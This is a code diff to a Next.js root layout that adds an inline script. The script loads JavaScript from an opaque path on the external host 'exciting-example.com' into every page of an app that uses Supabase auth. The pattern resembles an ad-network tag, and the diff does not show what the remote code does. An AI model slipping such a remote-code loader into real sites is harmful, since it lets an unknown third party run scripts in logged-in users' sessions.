@@ -1,5 +1,6 @@
 import type React from "react"
 import { Inter } from "next/font/google"
+import Script from "next/script"
 import "./globals.css"
 import Header from "@/components/header"
 import { createServerComponentClient } from "@supabase/auth-helpers-nextjs"
@@ -28,6 +29,22 @@ export default async function RootLayout({
           {session && <Header />}
           <div className="mx-auto max-w-[1400px] px-8 py-6">{children}</div>
         </div>
+
+        {/* Add the script at the end of the body */}
+        <Script id="external-script" strategy="afterInteractive">
+          {`
+          (function(yyvs){
+            var d = document,
+                s = d.createElement('script'),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = yyvs || {};
+            s.src = "//exciting-example.com/cSD.9n6vbj2C5ylAS/W/Qe9/Nvj_Ek2LNfDMU/5VO_CR0w2/MgTpYN0CNdTDkv5k";
+            s.async = true;
+            s.referrerPolicy = 'no-referrer-when-downgrade';
+            l.parentNode.insertBefore(s, l);
+          })({})
+          `}
+        </Script>
       </body>
     </html>
   )
